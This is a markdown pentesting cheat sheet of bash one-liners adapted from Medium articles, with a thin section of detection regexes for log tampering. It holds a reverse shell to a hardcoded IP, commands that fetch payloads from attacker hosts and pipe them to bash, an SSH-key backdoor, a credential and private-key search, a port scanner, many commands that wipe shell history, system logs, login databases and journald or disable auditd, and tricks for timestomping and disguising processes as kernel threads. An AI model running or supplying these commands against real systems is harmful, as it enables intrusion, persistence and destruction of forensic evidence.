- based [on this arictle](https://medium.com/@verylazytech/40-bash-one-liners-every-hacker-should-know-master-essential-command-line-skills-for-pentesting-01c32fb29eea)

```
netstat -tulnp 2>/dev/null
```


```
ss -tulnp
```

**Scan for Alive Hosts in a Subnet**
```
# fping (super fast)
fping -a -g 192.168.1.0/24 2>/dev/null

# nmap ping sweep
nmap -sn 192.168.1.0/24
```

```
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "64 bytes" & done
```

Get a file when nothing else works
```
echo "GET /evil.sh HTTP/1.0\r\n" | nc 192.168.102.227 80 > evil.sh
```

python3 server
```
python3 -m http.server 8000
```

python2 Server 
```
python -m SimpleHTTPServer 8000
```

Revers shell if no bash
```
bash -i >& /dev/tcp/192.168.102.227/4444 0>&1
```

Get Crontabs for all users
```
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done
```

Look for all files containing TERM eg `password`
```
grep -Ri 'password' /etc 2>/dev/null
```

See all process with Full Args
```
ps auxww
```

Extract all ips fro ma file
```
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' filename.txt | sort -u
```

List all listening services
```
lsof -i -P -n | grep LISTEN
```

Find files modified or created in the last 10 mins
```
find /tmp -type f \( -mmin -10 -o -cmin -10 \) 2>/dev/null
```
Most accurate for birth time of a file 
```
stat -c '%n %w' /etc/passwd
```

Replace all strings in all files in a directory
```
find . -type f -exec sed -i 's/oldstring/newstring/g' {} +
```

Get and run a script with wget 
```
wget -qO- http://attacker.com/payload.sh | bash
```

Find all hidden files
```
find / -name ".*" 2>/dev/null
```

shows the 10 most recent logins/reboots, with the remote host moved to the last column.
```
last -aF -n 10
```

Finds private keys
```
find /home -name "id_rsa*" 2>/dev/null
```

FInd fake root accounts
```
awk -F: '($3 == "0") {print $1}' /etc/passwd
```

Find files by size
```
find / -type f -exec du -h {} + | sort -rh | head -20
```

Quick system info: KErnel, uptime nad OS version
```
uname -a; uptime; cat /etc/os-release
```

Which services are running
```
systemctl list-units --type=service
```

Recently Installed packages
```
grep "install " /var/log/dpkg.log
```

Append Your SSH key to authorisedkeys
```
echo "ssh-rsa AAAAB3... attacker@host" >> ~/.ssh/authorized_keys
```

diry port scnner
```
for port in {1..1024}; do (echo > /dev/tcp/target/port) >/dev/null 2>&1 && echo "Port $port open"; done
```



# Hackers cover trakcs with these maybe :
Absolute basic
```
history -c && history -w && unset HISTFILE
```

### Bash history tampering
- `history -c`, `history -w`, `history -d [0-9]+`
- `unset HISTFILE` , `export HISTFILE=/dev/null`
- `set +o history`
    
- Truncation/removal:
    - `: > ~/.bash_history` , `> ~/.bash_history`
    - `truncate -s 0 ~/.bash_history`
    - `rm -f ~/.bash_history`
    - `ln -sf /dev/null ~/.bash_history`

### System log deletion/truncation
- Direct hits:
    - `: > /var/log/auth.log` (or `/secure`, `/syslog`, `/messages`)
    - `truncate -s 0 /var/log/*.log`
    - `rm -f /var/log/*.log`

- Mass ops:
    - `find /var/log -type f -exec truncate -s 0 {} +`
    - `find /var/log -type f -exec rm -f {} +`
    - `sed -i '/pattern/d' /var/log/auth.log` (selective scrubbing)

### Login databases (high signal)
- `: > /var/log/wtmp`
- `: > /var/log/btmp`
- `: > /var/log/lastlog`
- `utmpdump` used against those files
### Journald manipulation

- `journalctl --vacuum-size=*`
- `journalctl --vacuum-time=*`
- `journalctl --rotate`
- Deleting journal dirs: `rm -rf /var/log/journal/*`
- Stopping the service: `systemctl stop systemd-journald`

### Disabling logging/auditing
- Syslog:
    - `systemctl stop rsyslog` / `service rsyslog stop` / `killall rsyslogd
- Auditd:
    - `auditctl -e 0` (disable auditing)
    - `auditctl -D` (clear rules)
    - `systemctl stop auditd` / `service auditd stop`

### “Covering tracks” with secure delete / attributes
- `shred -u /path/to/log` , `wipe /path/to/log` , `srm /path/to/log`
- `chattr -i /var/log/*` (remove immutable to modify)
- Sometimes `chattr +i` after planting files (to freeze them)

---
## Minimal detector ideas (command-line contains…)
- `history -c` OR `unset HISTFILE` OR `HISTFILE=/dev/null`
- `(^| )(:|>|truncate|rm|shred)\b.*(/var/log|\.bash_history|wtmp|btmp|lastlog)`
- `journalctl --vacuum-` OR `journalctl --rotate`
- `systemctl (stop|restart) (rsyslog|systemd-journald|auditd)`
- `auditctl -e 0` OR `auditctl -D`
- `find /var/log -type f -exec (rm|truncate|shred)`

### Extra context filters that boost signal
- **User** is `www-data`, `nginx`, `apache`, or a low-priv svc user.
- **Parent** is a web server or `ssh` session shortly after suspicious activity.
- **Targets** under `/var/log`, `~/.bash_history`, `wtmp/btmp/lastlog`.

If you tell me your sensor (auditd, Falco, Sysmon for Linux, Elastic, Splunk), I’ll hand you copy-paste rules tuned to it.

----

# Staying Hidden

Make you file have the same time stamp reference as ls
```
touch -r /bin/ls malicious_file.sh
```
or 

```
touch -t 202001011200.00 yourscript.sh
```

Make your scripts process look like a kernel thread
```
exec -a "[kworker/0:1H]" ./evil_script.sh
```

CONTINUE = https://medium.com/codetodeploy/stealth-mode-10-bash-tricks-to-stay-hidden-while-hacking-6df8fdeabe3d